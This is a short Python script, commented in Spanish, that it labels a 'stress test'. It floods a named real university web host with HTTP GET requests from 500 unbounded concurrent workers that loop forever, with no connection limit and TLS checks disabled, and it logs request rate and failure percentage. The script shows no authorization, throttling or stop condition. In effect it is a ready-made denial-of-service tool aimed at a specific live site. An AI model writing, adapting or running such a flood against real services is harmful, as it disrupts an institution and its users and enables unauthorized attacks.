import asyncio
import aiohttp
import time
import logging
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
log = logging.getLogger(__name__)

TARGET      = "https://siginv.uniguajira.edu.co"
WORKERS     = 500
REPORT_CADA = 10  # segundos entre reportes

stats = {"ok": 0, "fail": 0, "total": 0, "start": time.time()}

async def hit(session):
    try:
        async with session.get(TARGET, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as r:
            stats["total"] += 1
            if r.status < 500:
                stats["ok"] += 1
            else:
                stats["fail"] += 1
    except:
        stats["total"] += 1
        stats["fail"] += 1

async def worker(session):
    while True:
        await hit(session)

async def reporter():
    while True:
        await asyncio.sleep(REPORT_CADA)
        elapsed = round(time.time() - stats["start"], 1)
        rps = round(stats["total"] / elapsed, 1) if elapsed > 0 else 0
        pct_fail = round(stats["fail"] / stats["total"] * 100, 1) if stats["total"] > 0 else 0
        log.info(f"⚡ {rps} req/s | ✅ {stats['ok']} ok | ❌ {stats['fail']} fail ({pct_fail}%) | total: {stats['total']}")

async def main():
    log.info(f"🔥 Iniciando stress test — {WORKERS} workers — {TARGET}")
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker(session)) for _ in range(WORKERS)]
        tasks.append(asyncio.create_task(reporter()))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
